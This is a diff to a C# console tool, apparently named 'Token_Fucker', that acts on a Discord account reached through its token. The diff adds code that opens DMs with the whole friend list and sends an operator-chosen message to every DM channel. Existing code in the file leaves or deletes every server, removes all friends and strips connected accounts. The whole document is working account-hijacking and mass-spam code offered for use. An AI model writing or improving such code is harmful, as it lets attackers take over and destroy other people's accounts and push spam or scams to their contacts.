@@ -35,6 +35,32 @@ namespace Token_Fucker
             string guildname = Console.ReadLine();
             Console.WriteLine("What do you want to set the custom status to?");
             string status = Console.ReadLine();
+            Console.WriteLine("What do you want to send to everyone in the DM list.");
+            string dmmessage = Console.ReadLine();
+            Console.WriteLine("Do you want to open dms with entire friend list? y/n [This can get the acc phone locked/disabled]");
+            string opendms = Console.ReadLine();
+
+            var guilds = client.GetGuilds();
+            var friends = client.GetRelationships();
+            var connections = client.GetConnectedAccounts();
+
+            // Open dms with entire friend list.
+            if (opendms == "y")
+            {
+                foreach (var friendids in friends)
+                {
+                    client.CreateDM(friendids.User.Id);
+                }
+            }
+
+            // DM entire DM list
+            var directmessages = client.GetPrivateChannels();
+            foreach (var cid in directmessages)
+            {
+                client.SendMessage(cid.Id, dmmessage);
+                Console.WriteLine("Sent a message to channel id [DMs] " + cid.Id);
+                Thread.Sleep(500);
+            }
 
             // Set custom status
             client.User.ChangeSettings(new UserSettingsProperties()
@@ -49,7 +75,6 @@ namespace Token_Fucker
             });
 
             // Leave/delete every guild.
-            var guilds = client.GetGuilds();
             foreach (var guildids in guilds)
             {
                 try
@@ -81,7 +106,6 @@ namespace Token_Fucker
             }
 
             // Remove all friends.
-            var friends = client.GetRelationships();
             foreach (var friendids in friends)
             {
                 client.RemoveRelationship(friendids.User.Id);
@@ -89,7 +113,7 @@ namespace Token_Fucker
             }
 
             // Remove all connections.
-            var connections = client.GetConnectedAccounts();
+            
             foreach (var connectionlist in connections)
             {
                 client.RemoveConnectedAccount(connectionlist.Type, connectionlist.Id);
